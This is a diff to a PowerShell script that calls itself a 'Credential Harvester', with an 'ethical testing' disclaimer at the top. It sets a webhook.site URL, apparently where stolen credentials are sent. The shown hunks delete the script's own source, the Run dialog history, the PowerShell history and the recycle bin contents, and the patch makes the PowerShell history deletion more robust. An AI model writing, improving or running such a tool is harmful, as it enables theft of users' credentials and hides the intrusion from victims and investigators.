@@ -1,4 +1,4 @@
-# Credential Harvester Script - Corrected Version
+# Credential Harvester Script - Corrected Version (with PSReadLine History Fix)
 # WARNING: Use only for ethical testing/education. Unauthorized use is illegal.
 
 $WebhookUrl = "https://webhook.site/75342571-78da-45fc-8f61-caf01ffc1f5f"
@@ -86,10 +86,14 @@ Remove-Item $SourceFilePath -Force -ErrorAction SilentlyContinue
 # Delete run box history (requires admin privileges)
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null
 
-# Delete PowerShell history (check if path exists)
-$historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+# Delete PowerShell history (with try-catch to handle missing PSReadLine or path)
+try {
+    $historyPath = (Get-PSReadLineOption).HistorySavePath
+    if ($historyPath -and (Test-Path $historyPath)) {
+        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+    }
+} catch {
+    # Silently ignore if PSReadLine is not available or path doesn't exist
 }
 
 # Delete contents of recycle bin (requires admin privileges)
